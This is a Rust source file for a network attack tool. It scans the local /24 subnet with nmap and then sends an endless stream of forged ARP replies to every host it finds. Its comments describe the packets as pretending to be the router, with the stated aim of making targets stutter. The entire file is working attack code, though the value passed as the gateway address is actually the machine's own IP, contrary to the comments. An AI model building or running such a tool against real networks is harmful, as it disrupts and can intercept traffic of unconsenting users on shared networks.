use clap::Parser;
use pnet::datalink::{self, Config, NetworkInterface, interfaces};
use pnet::packet::MutablePacket;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::util::MacAddr;
use std::hint::spin_loop;
use std::io::Write;
use std::net::{IpAddr, Ipv4Addr};
use std::process::Command;
use std::time::Duration;

use libc::{CPU_SET, CPU_ZERO, cpu_set_t, sched_setaffinity};
use std::sync::{LazyLock, OnceLock};
use std::thread::{sleep, spawn};
use std::{io, mem};

#[derive(Parser, Clone)]
#[command(version, about, long_about = None)]
pub struct Args {
    /// In microsecond, default to 200 enough to make target stuttering (high ping)
    #[arg(short, long, default_value_t = 200)]
    pub sleep: u64,
    /// Thread N will be pinned
    #[arg(short, long, default_value_t = 1)]
    pub thread: u64,
    /// Default most gateway
    #[arg(short, long, default_value = "192.168.1.1")]
    pub gateway: String,
    /// Careful to use this, if -s/--sleep is set will be ignore
    #[arg(long, default_value_t = false)]
    pub no_sleep: bool,
}

fn init() {
    let _ = &*NETWORK_INTERFACE;
    let _ = &*SELF_INFO;
    let _ = &*ARGS;
}
static ALL_IPS: OnceLock<Vec<Ipv4Addr>> = OnceLock::new();
static NETWORK_INTERFACE: LazyLock<NetworkInterface> = LazyLock::new(network_interface);
static SELF_INFO: LazyLock<(Ipv4Addr, MacAddr)> = LazyLock::new(scan_device);
static ARGS: LazyLock<Args> = LazyLock::new(parse_args);

fn main() {
    init();
    let mut all_ips = get_all_ips();
    let self_device = &*SELF_INFO;
    all_ips.retain(|ip| *ip != self_device.0);

    println!("targeted to all ip: {:?}", all_ips);
    if all_ips.is_empty() {
        panic!("There's no available ip (excluded gateway and yourself)")
    }
    let _ = ALL_IPS.set(all_ips);
    send_l2_packets();
}

fn parse_args() -> Args {
    Args::parse()
}

fn get_active_interface(interfaces: &[NetworkInterface]) -> Option<&NetworkInterface> {
    interfaces.iter().find(|iface| {
        iface.is_up()
            && iface.mac.is_some() // Excludes loopback 'lo'
            && iface.ips.iter().any(|ip_net| {
            matches!(ip_net.ip(), IpAddr::V4(ip) if !ip.is_loopback())
        })
    })
}

fn get_all_ips() -> Vec<Ipv4Addr> {
    let args = &*ARGS;
    let output = Command::new("nmap")
        .args(["-sn", &format!("{}/24", args.gateway)])
        .output()
        .expect("Failed to execute nmap");

    String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter(|line| line.contains("scan report for"))
        .filter_map(|line| line.split_whitespace().last())
        .filter_map(|ip| ip.parse::<Ipv4Addr>().ok())
        .filter(|&ip| ip != args.gateway.parse::<Ipv4Addr>().unwrap())
        .collect()
}

fn network_interface() -> NetworkInterface {
    let interfaces = interfaces();
    let active_interface = get_active_interface(&interfaces).unwrap();
    active_interface.clone()
}

fn scan_device() -> (Ipv4Addr, MacAddr) {
    let source_ip = NETWORK_INTERFACE
        .ips
        .iter()
        .find_map(|ip_net| {
            if let IpAddr::V4(ipv4) = ip_net.ip() {
                Some(ipv4)
            } else {
                None
            }
        })
        .unwrap();
    let source_mac = NETWORK_INTERFACE.mac.unwrap();
    (source_ip, source_mac)
}

fn set_affinity_core(core_id: usize) -> Result<(), i32> {
    unsafe {
        let mut cpuset: cpu_set_t = mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);
        let res = sched_setaffinity(0, mem::size_of::<cpu_set_t>(), &cpuset);
        if res != 0 {
            return Err(std::io::Error::last_os_error().raw_os_error().unwrap_or(0));
        }
    }
    Ok(())
}

fn send_l2_packets() {
    let handle = spawn(move || {
        let config = Config {
            write_buffer_size: 4096,
            read_buffer_size: 4096,
            read_timeout: None,
            write_timeout: None,
            channel_type: datalink::ChannelType::Layer2,
            bpf_fd_attempts: 1000,
            linux_fanout: None,
            promiscuous: false,
            socket_fd: None,
        };

        let selves = &*SELF_INFO;
        let nf = &*NETWORK_INTERFACE;
        let (mut tx, _rx) = match datalink::channel(nf, config) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("Failed to create datalink channel: {}", e),
        };

        set_affinity_core(ARGS.thread as usize).unwrap();
        spin_loop();

        loop {
            for target_ip in ALL_IPS.get().unwrap() {
                if *target_ip != selves.0 {
                    send_arp_packet(&mut *tx, nf, target_ip);
                }
            }
            if !ARGS.no_sleep {
                sleep(Duration::from_micros(ARGS.sleep));
            }
        }
    });

    loop {
        if handle.is_finished() {
            break;
        }

        print!("sending l2 packet to target");
        for _ in 0..ALL_IPS.get().unwrap().len() {
            print!(".");
            io::stdout().flush().unwrap();
            sleep(Duration::from_millis(500));
        }
        println!();
    }

    match handle.join() {
        Ok(_) => println!("Thread exited normally"),
        Err(e) => {
            let msg = e
                .downcast_ref::<String>()
                .map(|s| s.as_str())
                .or_else(|| e.downcast_ref::<&str>().copied())
                .unwrap_or("Unknown panic payload");
            eprintln!("Thread panicked: {}", msg);
        }
    }
}

fn send_arp_packet(
    tx: &mut dyn pnet::datalink::DataLinkSender,
    interface: &NetworkInterface,
    target_ip: &Ipv4Addr,
) {
    let source_mac = interface.mac.unwrap_or_else(|| {
        println!("Interface has no MAC address");
        MacAddr::new(0, 0, 0, 0, 0, 0)
    });

    let source_ip = interface
        .ips
        .iter()
        .find_map(|ip_net| {
            if let IpAddr::V4(ipv4) = ip_net.ip() {
                Some(ipv4)
            } else {
                None
            }
        })
        .unwrap_or_else(|| Ipv4Addr::new(192, 168, 1, 100));

    let ethernet_size = EthernetPacket::minimum_packet_size();
    let arp_size = MutableArpPacket::minimum_packet_size();
    let total_size = ethernet_size + arp_size;

    tx.build_and_send(1, total_size, &mut |packet| {
        build_arp_spoof(packet, source_mac, target_ip, source_ip)
    });
}

fn build_arp_spoof(packet: &mut [u8], my_mac: MacAddr, target_ip: &Ipv4Addr, gateway_ip: Ipv4Addr) {
    let mut ethernet_packet = MutableEthernetPacket::new(packet).unwrap();

    // Send directly to the target's MAC (if known) or broadcast
    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(my_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_packet = MutableArpPacket::new(ethernet_packet.payload_mut()).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);

    // CRITICAL: Use Reply (2) instead of Request (1)
    arp_packet.set_operation(ArpOperations::Reply);

    // Sender: You (claiming to be the Gateway)
    arp_packet.set_sender_hw_addr(my_mac);
    arp_packet.set_sender_proto_addr(gateway_ip); // Pretending to be the router

    // Target: The victim device
    arp_packet.set_target_hw_addr(MacAddr::new(0, 0, 0, 0, 0, 0)); // Usually ignored in unsolicited replies
    arp_packet.set_target_proto_addr(*target_ip);
}
